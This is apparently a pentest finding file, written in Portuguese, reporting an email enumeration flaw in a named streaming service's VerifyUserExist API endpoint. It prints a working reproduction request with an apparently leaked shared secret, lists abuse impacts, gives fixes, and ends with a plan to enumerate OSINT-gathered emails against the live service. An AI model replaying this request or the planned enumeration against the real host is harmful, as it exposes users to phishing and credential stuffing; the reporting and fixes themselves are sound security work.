@@ -1,0 +1,41 @@
+# F-007 VerifyUserExist — Enumeração de Emails
+
+Alvo: netmovies-service.ottvs.com.br (API)
+Severidade: ALTA
+Timestamp: 2026-08-20T03:35:00Z
+
+## Reprodução
+```
+POST https://netmovies-service.ottvs.com.br/v1/android/VerifyUserExist
+Content-Type: application/json
+
+{"Email":"contato@netmovies.com.br","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}
+
+Resposta: {"Result":0,"Exists":true,"Message":"Usuário já cadastrado"}
+
+{"Email":"aaa@bbb.com","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}
+
+Resposta: {"Result":0,"Exists":false,"Message":""}
+```
+
+## Interpretação
+Endpoint `/VerifyUserExist` permite verificar se um email está cadastrado na
+plataforma sem qualquer autenticação (apenas o secret vazado). Isso permite
+enumeração massiva de emails de usuários da NetMovies.
+
+## Impacto
+- Extração de lista de emails válidos para:
+  - Cred-stuffing (tentar senhas comuns)
+  - Phishing direcionado
+  - Engenharia social
+  - Venda/doxxing de lista de usuários
+- Identificação de funcionários/contas VIP via emails corporativos
+
+## Recomendação
+1. **IMEDIATO**: Remover endpoint público ou exigir validação adicional
+2. Implementar rate limiting por IP
+3. Retornar resposta genérica ("verifique seu email") para emails existentes e não existentes
+4. Não retornar booleano Exists no response
+
+## Próximo passo
+Enumerar emails candidatos do OSINT para confirmar usuários cadastrados.
